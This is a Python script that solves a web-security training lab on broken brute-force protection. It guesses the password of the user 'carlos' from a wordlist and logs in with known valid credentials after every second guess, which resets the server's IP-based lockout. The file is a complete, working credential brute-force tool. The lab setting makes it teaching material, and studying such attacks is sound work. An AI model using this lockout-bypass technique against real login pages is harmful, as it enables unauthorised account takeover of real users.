#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 25/8/2023
#
# Lab: Broken brute-force protection, IP block
#
# Steps: 1. Brute force carlos password
#        2. After every 2 tries, login with correct
#           credentials to bypass blocking
#
#################################################################


###########
# imports
###########
import requests
import time
from colorama import Fore


#############################
# Global Variables
#############################
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0


#####################################
# Function to print in a nice format
#####################################
def print_progress(elapsed_time, fail_counter, success_counter, total_counts, text):
    print(Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes || " + Fore.RED + "Failed: " + Fore.WHITE +
          str(fail_counter) + " || " + Fore.WHITE + f"Trying ({success_counter}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    
    print(Fore.WHITE + "[#] Brute forcing password..")
    print(Fore.GREEN + "✅ Valid user: " + valid_user)
    
    # get the number of all passwords
    total_passwords = len(passwords)  

    for (index, password) in enumerate(passwords):
        # make a valid login after every password try
        if index % 2 == 0:
            # set data to send via POST
            data = {
                "username": "wiener",
                "password": "peter"
            }

            try:  
                # login as wiener to make a successful login
                response = requests.post(url, data, allow_redirects=False)
                
            except:
                print(Fore.RED + "\n[!] Couldn't send correct creds throuhg exception")
        
            # if login is successful
            if response.status_code == 302:  
                print(Fore.BLUE + "\nSend correct creds.. OK")
            
            else:
                print(Fore.RED + "\n[!] Couldn't send correct creds")
                
        # calculate the elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))
        
        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER, index, total_passwords, password)
        
        # set data to send via POST
        data = {
            "username": valid_user,
            "password": password
        }

        try:  
            # try to login with the password
            response = requests.post(url, data, allow_redirects=False, timeout=5)
            
        except:
            # update the failed counter
            FAILED_PASSWORDS_COUNTER += 1  
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
            continue
    
        # if valid password is found and login is successful
        if response.status_code == 302:  
            return password
        
        else:
            continue
        
    # if no passwords are found
    return None


##################################
# Function to save results
##################################
def save_results(elapsed_time, file_name, valid_user, valid_password):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    
    # results to saved in a file
    to_save = f"""
    ✅ Finished in: {elapsed_time} minutes \n\n\
    Username: {valid_user}, Password: {valid_password} \n\n\
    [!] Failed passwords count: {FAILED_PASSWORDS_COUNTER} \n\
    [!] Failed passwords: {FAILED_PASSWORDS} \n\n"""
    
    try:
        # create a file to save results in
        new_file = open(file_name, "x")

        # write results to the file
        new_file.write(to_save)

        print(Fore.YELLOW + f"\nResults was saved to: {file_name}")
    
    except:
        print(Fore.RED + "Couldn't create the file to save results")


###########
# Main
###########

# change this to your lab URL
url = "https://0a1300bf046fc9a78242d05b00f7009c.web-security-academy.net/login"

# change the file path of the password list
passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()

# capture the time before enumeration
start_time = time.time()  

# set valid username
valid_user = "carlos"  

# start brute forcing
valid_password = brute_force_password(start_time, url, "carlos", passwords) 

# if a valid password was found
if valid_password != None:  
    # calculate the elapsed time
    elapsed_time = int((time.time() - start_time) / 60) 

    print(Fore.GREEN + "\n\n✅ Login successfully: " + Fore.WHITE + " username: " +
          Fore.GREEN + valid_user + Fore.WHITE + ", password: " + Fore.GREEN + valid_password)
    print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")
    
    # save the results
    save_results(elapsed_time, "results", valid_user, valid_password)

else:  # no valid password was found
    # calculate the elapsed time
    elapsed_time = int((time.time() - start_time) / 60)  
    
    print("")
    print(Fore.RED + "[!] Couldn't find a valid password")
    print(Fore.GREEN + "Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")

    # save the results
    save_results(elapsed_time, "results", valid_user, "")


# print failed passwords
print(Fore.RED + "\nFailed passwords count: " + Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE + "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
